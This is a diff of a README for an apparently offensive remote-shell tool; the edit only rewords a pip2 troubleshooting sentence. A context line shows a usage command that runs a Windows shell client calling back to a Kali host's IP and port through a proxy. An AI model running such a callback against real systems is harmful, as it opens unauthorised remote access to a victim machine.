@@ -42,7 +42,7 @@ C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
 4. choose port ```80``` - Other ports may work, but it works best with port ```80```
 
 ## Issues
-If there are issues with pip2 installation (due to deprecation) refer to this ```https://bootstrap.pypa.io/``` to get pip for python2 working again. 
+If there are issues with pip2 installation (due to deprecation) refer to this ```https://bootstrap.pypa.io/``` to get pip working again for python2. 
 
 If there are issues with pycrypto, install the following:
 ```sudo apt install build-essential libssl-dev libffi-dev python-dev```
